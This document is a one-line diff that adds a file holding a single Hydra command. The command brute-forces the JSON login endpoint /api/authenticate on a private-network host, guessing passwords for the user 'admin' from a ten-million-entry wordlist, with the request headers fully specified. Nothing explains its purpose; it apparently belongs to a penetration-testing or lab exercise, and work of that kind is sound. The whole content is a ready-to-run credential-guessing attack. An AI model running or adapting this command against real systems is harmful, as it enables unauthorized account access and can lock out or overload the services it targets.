@@ -1,0 +1,1 @@
+hydra -I -v -V -l "admin" -P  /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt -s 8080 10.137.0.1 http-post-form "/api/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:error.validation:H=Accept: application/json, text/plain, */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate:H=Content-Type: application/json:H=Connection: close"
